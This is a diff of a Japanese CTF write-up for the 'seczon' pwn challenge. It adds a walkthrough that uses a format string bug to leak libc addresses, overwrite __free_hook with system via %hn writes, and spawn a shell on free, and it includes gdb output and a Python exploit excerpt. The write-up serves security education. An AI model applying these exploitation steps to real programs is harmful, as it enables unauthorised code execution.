@@ -125,7 +125,7 @@ gef➤  grep sh
   0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
 ```
 
-PIEが無効な環境ではbssセクションは静的でかつ書き込み可能なため、このbssセクションを利用する。`gets`で`sh`文字列をbssセクションに書いて、その後`system`をcallするようなROPチェーンにすればよい。
+PIEが無効な環境ではbssセクションは静的でかつ書き込み可能なため、このbssセクションを利用する。`gets`で`sh`文字列をbssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
 ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
 
 * `pop rdi`ガジェット
@@ -213,11 +213,11 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes	0		6	seczon
 ```
 
-とりあえず適当に動かしてみているとcommentメニューのconfirmationの際にformat string bugが見つかった。`printf`のユーザーからの入力値をそのまま渡すようになっている場合に発生するバグで、スタック上や任意のアドレスにあるメモリー内容のリーク、また任意アドレスへの書き込みが出来てしまう。
+とりあえず適当に動かしてみているとcommentメニューのconfirmationの際にformat string bugが見つかった。`printf`にユーザーからの入力値をそのまま渡すようになっている場合に発生するバグで、スタック上や任意のアドレスにあるメモリー内容のリーク、また任意アドレスへの書き込みが出来てしまう。
 
 なお、このバグを疑ってかかる場合`%p %p %p %p`とか適用に入力して試せばよい。
 ```
-$ ./seczon 
+$ ./seczon
 +---------------------+
 |      Seczon.com     |
 +---------------------+
@@ -235,14 +235,98 @@ Action:
 Choose item ID
 >> 0
 Input a comment
->> BBBBAAAA %p %p %p %p %p %p %p
+>> BBBAAAA %p %p %p %p %p %p %p
 Confirmation
 aaaa
-BBBBAAAA 0x23 0xf76e25a0 0x5656ecad 0xf76e2000 (nil) 0x42424258 0x41414142
+BBBAAAA 0x23 0xf7fb85a0 0x56555cad 0xf7fb8000 (nil) 0x42424218 0x41414141
 Action:
 >> 
+```
+
+上記見ると既に`0xf7fb85a0`がlibcのアドレスっぽいし、`0x56555cad`はtextセクションのアドレスのようである。デバッガで確認すると、`0xf7fb85a0`はlibcの`_IO_2_1_stdin`のアドレスで、`0x56555cad`はcomment関数内のアドレスであることがわかった。
+```
+gef➤  x/xw 0xf7fb85a0
+0xf7fb85a0 <_IO_2_1_stdin_>:	0xfbad208b
+gef➤  x/xw 0x56555cad
+0x56555cad <comment+38>:	0x83cc4589
+gef➤  
+```
+
+libcとtextのアドレスをリークできるので、事前にオフセットを確認してリークしたアドレスから実アドレスを求めればASLR及びPIEをバイパスできることがわかった。`system(sh)`の実行のための`system`関数を動的に求めることができる。
+
+次にどうやって`system(sh)`を呼び出すかを考える。よくよくIDAやgdbを使ってみているとプログラム終了時にヒープ領域を`free`で解放しているコードがあった。
+
+* IDA
+![2018-05-27 19 02 18](https://user-images.githubusercontent.com/9530961/40584711-93ca5bec-61e0-11e8-8160-153d94398bc4.png)
+
+* gdb 該当箇所でブレーク
+`free`の引数にヒープのアドレス（1番目のアイテムがある場所）が渡っている。
+```
+[-------------------------------------code-------------------------------------]
+   0x56555b1c <fin+6>:	mov    eax,ds:0x5655804c
+   0x56555b21 <fin+11>:	sub    esp,0xc
+   0x56555b24 <fin+14>:	push   eax
+=> 0x56555b25 <fin+15>:	call   0xf7e78750 <free>
+   0x56555b2a <fin+20>:	add    esp,0x10
+   0x56555b2d <fin+23>:	nop
+   0x56555b2e <fin+24>:	leave  
+   0x56555b2f <fin+25>:	ret
+Guessed arguments:
+arg[0]: 0x56559008 --> 0x6873 ('sh')
+arg[1]: 0xf7fb83dc --> 0xf7fb91e0 --> 0x0 
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd240 --> 0x56559008 --> 0x61616161 ('aaaa') <--- ヒープのアドレス（1番目のアイテムがある場所）
+0004| 0xffffd244 --> 0xf7fb83dc --> 0xf7fb91e0 --> 0x0 
+0008| 0xffffd248 --> 0xffffd2d8 --> 0xf7fb91e0 --> 0x0 
+0012| 0xffffd24c --> 0xf7fe9a03 (add    esp,0x10)
+0016| 0xffffd250 --> 0xf7ffd4e4 --> 0x0 
+0020| 0xffffd254 --> 0xf7fb8da7 --> 0xfb98700a 
+0024| 0xffffd258 --> 0xffffd2d8 --> 0xf7fb91e0 --> 0x0 
+0028| 0xffffd25c --> 0xf7fe9a74 (sub    esi,0x1)
+[------------------------------------------------------------------------------]
+```
+
+GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名前に`sh`文字列を書いておけば、プログラム終了時に`system("sh")`が呼ばれる、ただし今回のバイナリはFull RELROのためGOT Overwriteは出来ない。よって`__free_hook`に`system`のアドレスを書き込んで、`free`が呼ばれた時に`system`をフックすることにした。PIEが有効なバイナリの場合、`__free_hook`や`__malloc_hook`を使ったエクスプロイトをすることが多い。
+
+`__free_hook`はlibcのメモリー領域にあるので、これも事前にオフセットを確認しておけば動的に求めることができる。よって下記手順にてエクスプロイトを作っていくことにした。textセクションのリークは不要になった。
+
+* 1. fsbでlibcのアドレス(`_IO_2_1_stdin`のアドレス)をリーク
+* 2. リークしたアドレスから`_IO_2_1_stdin`のオフセットを減算してlibcのベースアドレスを求める
+* 3. libcのベースアドレスと`system`のオフセット、`__free_hook`のオフセットを各々加算して、`system`と`__free_hook`を動的に求める
+* 4. fsbで`system`を`__free_hook`に書き込む
+* 5. メニュー画面で1〜4以外のキー入力をしてプログラムを終了させる = `free`が呼ばれる
+
+またfsbによるメモリー内容のリークや任意アドレスへの書き込みは下記サイトが役に立つので適宜参照しながらエクスプロイトを作っていった。
+[fsbの資料](https://gist.github.com/hhc0null/08c43983b4551f506722)
 
 ```
+    add("sh"+"A\0") <--- 1番目のアイテムにshを書いておく、末尾がnullされるので適応な文字"A"を追加
+    comment("0","BBBAAAA %p %p %p %p %p %p %p") <--- fsbによりスタックをリーク
+
+    # leak libc
+    read_until(f,"AAAA ")
+    read_until(f," 0x")
+    libc = int(f.read(8),16) - _IO_2_1_stdin_offset  <--- libcベースアドレスを計算
+    print "libc: ",hex(libc)
+    system = libc + system_offset   <--- systemを計算
+    print "system: ",hex(system)
+    free_hook = libc + free_hook_offset  <--- __free_hookを計算
+    print "free_hook: ",hex(free_hook)
+    
+    # set system in __free_hook
+    system1 = u(p(system)[:2]+"\x00"*2)
+    print hex(system1)
+    system2 = u(p(system)[2:]+"\x00"*2)
+    print hex(system2)
+    comment("0","%"+str(system1)+"x%10$hn%"+"P"+p(free_hook))    <--- systemのアドレスを2バイトづつ__free_hookに書き込む
+    comment("0","%"+str(system2)+"x%10$hn%"+"P"+p(free_hook+2))
+
+    # trigger free
+    f.write("\n")
+
+```
+
+[exp_seczon.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_seczon.py)
 
 ```
 $ python exp_seczon.py -r
